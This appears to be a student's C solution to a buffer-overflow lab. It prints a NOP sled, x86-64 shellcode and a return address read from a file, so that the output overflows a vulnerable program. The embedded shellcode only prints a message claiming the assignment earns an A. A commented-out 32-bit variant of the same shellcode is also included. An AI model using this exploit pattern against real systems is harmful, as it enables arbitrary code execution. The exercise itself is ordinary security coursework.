
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int main()
{
  void* buffer;
  FILE *fp = fopen("address.txt","r");
  fscanf(fp, "%lx", (unsigned long)&buffer);
  fclose(fp);
  long x = (long) buffer;
  unsigned char *ret_add = (unsigned char *) &x;
  
  char array_1[2000];
  char nop[4]= "\x90";
 
 char malicious[84] ="\xeb\x33\x53\x61\x68\x69\x6c\x20\x4b\x68\x61\x6e\x6e\x61\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x8d\x35\xbe\xff\xff\xff\x48\x31\xd2\xb2\x33\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05";
  for (int i =0; i <134; i++){
   strcat(array_1,nop);
 }
 
  
     fputs(array_1,stdout);
   fputs(malicious,stdout);
   fputs(ret_add, stdout);
   
 
  //printf("\xeb\x33\x35\x53\x61\x68\x69\x6c\x20\x4b\x68\x61\x6e\x6e\x61\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41\x31\xc0\xb0\x01\x89\xc7\x8d\x35\xc1\xff\xff\xff\x31\xd2\xb2\x33\x0f\x05\xb0\x3c\x31\xff\x0f\x05")
  
}
